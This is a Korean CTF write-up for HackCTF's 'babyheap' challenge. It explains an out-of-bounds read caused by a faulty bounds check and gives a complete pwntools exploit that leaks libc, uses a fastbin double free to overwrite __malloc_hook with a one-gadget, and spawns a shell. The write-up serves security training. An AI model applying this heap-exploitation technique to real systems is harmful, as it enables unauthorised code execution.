---
title: "[HackCTF]babyheap"
date: 2020-2-16
ctf: HackCTF
layout: post
published : false
---

메뉴는 3가지로 malloc, free, show할 수 있다. 우리가 생성할 수 있는 청크가 최대 6개다. 

원하는 사이즈만큼 malloc 해준다. 

```c
unsigned __int64 __fastcall Malloc(signed int a1)
{
  int v2; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("size: ");
  _isoc99_scanf("%d", &v2);
  if ( a1 > 5 )
    exit(1);
  ptr[a1] = malloc(v2);
  printf("content: ", &v2);
  read(0, ptr[a1], v2);
  return __readfsqword(0x28u) ^ v3;
}
```

원하는 인덱스의 청크를 해제해준다. 

```c
unsigned __int64 Free()
{
  int v1; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("index: ");
  _isoc99_scanf("%d", &v1);
  if ( v1 < 0 || v1 > 5 )
    exit(1);
  free(ptr[v1]);
  return __readfsqword(0x28u) ^ v2;
}
```

청크 릭해줄 수 있다. 여기서 %d로 입력받고 v1값을 검사할 때 and연산으로 검사해서 oob가 터진다.

```c
unsigned __int64 Show()
{
  int v1; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("index: ");
  _isoc99_scanf("%d", &v1);
  if ( v1 < 0 && v1 > 5 )
    exit(1);
  puts(ptr[v1]);
  return __readfsqword(0x28u) ^ v2;
}
```

show메뉴에서 *ptr에 입력받아서  해당 섹션을 이용해서 oob로 leak해줬다. `(leak@ptr@ptr - *ptr) / 8`

```
LOAD:0000000000400590 ; ELF RELA Relocation Table
LOAD:0000000000400590                 Elf64_Rela <601FA0h, 700000006h, 0> ; R_X86_64_GLOB_DAT free
LOAD:00000000004005A8                 Elf64_Rela <601FA8h, 300000006h, 0> ; R_X86_64_GLOB_DAT puts
LOAD:00000000004005C0                 Elf64_Rela <601FB0h, 0D00000006h, 0> ; R_X86_64_GLOB_DAT __stack_chk_fail
LOAD:00000000004005D8                 Elf64_Rela <601FB8h, 900000006h, 0> ; R_X86_64_GLOB_DAT printf
LOAD:00000000004005F0                 Elf64_Rela <601FC0h, 400000006h, 0> ; R_X86_64_GLOB_DAT read
LOAD:0000000000400608                 Elf64_Rela <601FC8h, 0E00000006h, 0> ; R_X86_64_GLOB_DAT __libc_start_main
LOAD:0000000000400620                 Elf64_Rela <601FD0h, 100000006h, 0> ; R_X86_64_GLOB_DAT __gmon_start__
LOAD:0000000000400638                 Elf64_Rela <601FD8h, 0A00000006h, 0> ; R_X86_64_GLOB_DAT malloc
LOAD:0000000000400650                 Elf64_Rela <601FE0h, 500000006h, 0> ; R_X86_64_GLOB_DAT setvbuf
LOAD:0000000000400668                 Elf64_Rela <601FE8h, 0F00000006h, 0> ; R_X86_64_GLOB_DAT atoi
LOAD:0000000000400680                 Elf64_Rela <601FF0h, 600000006h, 0> ; R_X86_64_GLOB_DAT __isoc99_scanf
LOAD:0000000000400698                 Elf64_Rela <601FF8h, 0B00000006h, 0> ; R_X86_64_GLOB_DAT exit
LOAD:00000000004006B0                 Elf64_Rela <602020h, 200000005h, 0> ; R_X86_64_COPY stdout
LOAD:00000000004006C8                 Elf64_Rela <602030h, 800000005h, 0> ; R_X86_64_COPY stdin
LOAD:00000000004006E0                 Elf64_Rela <602040h, 0C00000005h, 0> ; R_X86_64_COPY stderr
LOAD:00000000004006E0 LOAD            ends
```

언솔빈하고 패빈할라 했는데 청크가 부족해서 할 수 없었고 릭은 show에서 oob터지는 거 이용해 leak한다음에 패빈 덥으로 __malloc_hook을 원샷으로 덮어주면 된다. 그리고 double free해줘서 abort로 free corruption뜨게 해서 쉘 따면 된다.

> exploit.py

```python
from pwn import *

context.log_level = 'debug'
e = ELF('./babyheap')
#p = process('./babyheap')
p = remote('ctf.j0n9hyun.xyz',3030)
libc = e.libc
sa = lambda x,y : p.sendafter(x,y)
sla = lambda x,y : p.sendlineafter(x,y)
stdout_offset = 0x00000000004006B0
ptr = 0x0000000000602060

def malloc(size,content):
	sa('>','1')
	sla(':',str(size))
	sa(':',content)

def free(index):
	sa('>','2')
	sla(':',str(index))

def show(index):
	sa('>','3')
	sla(':',str(index))

show((stdout_offset-ptr)/8)
libc_base = u64(p.recvuntil('\x7f')[-6:]+'\x00\x00') - libc.symbols['_IO_2_1_stdout_']
log.info('libc_base : {}'.format(hex(libc_base)))
malloc_hook = libc_base + libc.symbols['__malloc_hook']
log.info('__malloc_hook : {}'.format(hex(malloc_hook)))

malloc(100,'AAAA')
malloc(100,'BBBB')

free(0)
free(1)
free(0)

malloc(100,p64(malloc_hook-35))
malloc(100,'CCCC')
malloc(100,'DDDD')
malloc(100,'\x00'*19+p64(libc_base + 0xf02a4))

free(2)
free(2) # abort

p.interactive()
```

